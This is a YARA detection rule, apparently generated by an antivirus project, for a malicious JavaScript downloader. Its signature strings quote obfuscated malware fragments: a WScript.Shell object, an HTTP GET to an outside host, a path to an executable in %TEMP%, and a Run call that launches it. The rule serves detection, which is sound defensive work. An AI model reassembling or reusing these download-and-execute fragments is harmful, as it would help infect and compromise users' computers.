rule sig_20160401_1e82007842bf46a5c688adc3d604f662 {
  meta:
    description = "datamaliciousorder - file 20160401_1e82007842bf46a5c688adc3d604f662.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "82c42b0086e1bfd509efc254aeab7d966066324cf565751ec98507eaa5529bb7"

  strings:
    $s1  = "var UimMhk = function JiSza() {return WScript[MpoIqk](\"WScript\"+\".Shell\");}(), YgIeb = 11;" fullword ascii
    $s2  = "function FcOyv(DyJt, ZjNso){LrRsa = LrRsa * 1; return DyJt - ZjNso;};" fullword ascii
    $s3  = "UomEy[IvcPcd](\"G\" + \"ET\", \"http://ekotrade.linuxpl.info/b6dsa\", false);" fullword ascii
    $s4  = "if (UomEy[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function QlXa(){return OwqIry + \"\";};" fullword ascii
    $s6  = "function TrFp() {return ((XlNip == true) && (XlNip == PsrFx)) ? 1 : LrRsa;};" fullword ascii
    $s7  = "function GtgGim(HiZe) {var JmEep = (1, 2, 3, 4, 5, HiZe); return JmEep;};" fullword ascii
    $s8  = "XlNip = true; " fullword ascii
    $s9  = "var PsrFx = false;" fullword ascii
    $s10 = "function VhhMh()" fullword ascii
    $s11 = "return FcOyv(IyMu, XpVw);" fullword ascii
    $s12 = "function OuPy(){return MpoIqk;};" fullword ascii
    $s13 = "var XlNip = false;" fullword ascii
    $s14 = "var EeKdm = new this[\"Date\"]();" fullword ascii
    $s15 = "function CaJk() {return UimMhk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"kdx9NAqiA.ex\" + \"e\";};" fullword ascii
    $s16 = "}while (YpNd);" fullword ascii
    $s17 = "var YhLt = false;" fullword ascii
    $s18 = "PsrFx = true; " fullword ascii
    $s19 = "function XnjAg(){return 23;};" fullword ascii
    $s20 = "function FaPe(LpSrf){UimMhk[\"R\"+\"un\"](LpSrf, LrRsa, LrRsa);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}